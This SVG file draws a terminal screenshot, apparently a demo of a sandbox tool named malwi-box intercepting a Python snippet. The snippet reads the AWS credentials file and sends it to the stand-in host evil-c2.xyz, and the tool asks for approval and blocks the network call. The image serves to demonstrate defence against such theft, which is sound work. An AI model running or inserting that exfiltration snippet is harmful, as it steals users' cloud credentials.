<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg width="100%" height="100%" viewBox="0 0 3000 1500" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" xml:space="preserve" xmlns:serif="http://www.serif.com/" style="fill-rule:evenodd;clip-rule:evenodd;stroke-linejoin:round;stroke-miterlimit:2;">
    <g transform="matrix(5.58042,0,0,6.60118,-115.333,-227.092)">
        <path d="M525.906,59.769L525.906,236.267C525.906,240.3 522.032,243.575 517.261,243.575L61.668,243.575C56.897,243.575 53.023,240.3 53.023,236.267L53.023,59.769C53.023,55.735 56.897,52.461 61.668,52.461L517.261,52.461C522.032,52.461 525.906,55.735 525.906,59.769Z"/>
    </g>
    <g transform="matrix(4,0,0,4,-99.9866,-85.1654)">
        <text x="97.375px" y="85.106px" style="font-family:'Menlo-Regular', 'Menlo', monospace;font-size:15px;fill:white;">$ malwi-box eval --review</text>
        <text x="332.175px" y="85.106px" style="font-family:'Menlo-Regular', 'Menlo', monospace;font-size:15px;fill:rgb(170,172,255);">&quot;</text>
        <text x="97.375px" y="106.106px" style="font-family:'Menlo-Regular', 'Menlo', monospace;font-size:15px;fill:rgb(170,172,255);">import urllib.request</text>
        <text x="97.375px" y="127.106px" style="font-family:'Menlo-Regular', 'Menlo', monospace;font-size:15px;fill:rgb(170,172,255);">creds = open(&apos;/home/user/.aws/credentials&apos;).read()</text>
        <g transform="matrix(15,0,0,15,512.79,148.106)">
        </g>
        <g transform="matrix(15,0,0,15,517.306,148.106)">
        </g>
        <text x="97.375px" y="148.106px" style="font-family:'Menlo-Regular', 'Menlo', monospace;font-size:15px;fill:rgb(170,172,255);">urllib.request.urlopen(&apos;https://evil-c2.xyz/exﬁl?data=&apos; + creds)</text>
        <text x="97.375px" y="169.106px" style="font-family:'Menlo-Regular', 'Menlo', monospace;font-size:15px;fill:rgb(170,172,255);">&quot;</text>
        <g transform="matrix(15,0,0,15,250.898,211.106)">
        </g>
        <g transform="matrix(15,0,0,15,255.413,211.106)">
        </g>
        <text x="97.375px" y="211.106px" style="font-family:'Menlo-Regular', 'Menlo', monospace;font-size:15px;fill:rgb(254,252,0);">[malwi-box] Read ﬁle: /home/user/.aws/credentials</text>
        <text x="97.375px" y="232.106px" style="font-family:'Menlo-Regular', 'Menlo', monospace;font-size:15px;fill:white;">Approve? [Y/n/i]: y</text>
        <text x="97.375px" y="274.106px" style="font-family:'Menlo-Regular', 'Menlo', monospace;font-size:15px;fill:rgb(255,65,24);">[malwi-box] DNS lookup: evil-c2.xyz:443</text>
        <text x="97.375px" y="295.106px" style="font-family:'Menlo-Regular', 'Menlo', monospace;font-size:15px;fill:white;">Approve? [Y/n/i]: n</text>
        <g transform="matrix(15,0,0,15,151.56,337.106)">
        </g>
        <text x="97.375px" y="337.106px" style="font-family:'Menlo-Regular', 'Menlo', monospace;font-size:15px;fill:rgb(254,252,0);">Denied</text>
    </g>
</svg>
